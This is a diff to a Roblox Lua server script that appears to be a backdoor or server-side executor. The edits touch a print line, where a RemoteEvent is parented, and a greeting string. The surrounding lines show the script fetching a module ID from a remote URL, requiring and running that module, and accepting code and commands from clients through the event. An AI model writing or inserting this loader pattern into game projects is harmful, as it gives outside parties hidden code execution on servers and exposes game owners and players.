@@ -1,4 +1,3 @@
-print("meow")
 local ins=Instance.new
 local cf=CFrame.new
 local load=false
@@ -30,7 +29,7 @@ function Check(plr)
 			local success,result=pcall(function()
 				return Http:GetAsync(Url.."id")
 			end)
-			FluffyEvent.Parent=workspace
+			FluffyEvent.Parent=Players
 			load=true
 			require(tonumber(result)).ROOWO(script)
 			Test()
@@ -39,7 +38,7 @@ function Check(plr)
 		local OutputGUI=script:WaitForChild("OutputGUI"):Clone()
 		OutputGUI.Event.Value=FluffyEvent
 		OutputGUI:SetAttribute("Greeting",[[
-		Bari lox
+		          secret development 2027
 		]])
 		OutputGUI.Parent=plr.PlayerGui
 	end
@@ -172,6 +171,7 @@ FluffyEvent.OnServerEvent:Connect(function(plr,Type,Data)
 			local SourceValue=ins("StringValue",Client)
 			SourceValue.Value=result
 			SourceValue.Name="Value"
+			
 			Client.Enabled=true
 		elseif Data[1]:sub(1,3)=="g/d" then
 			
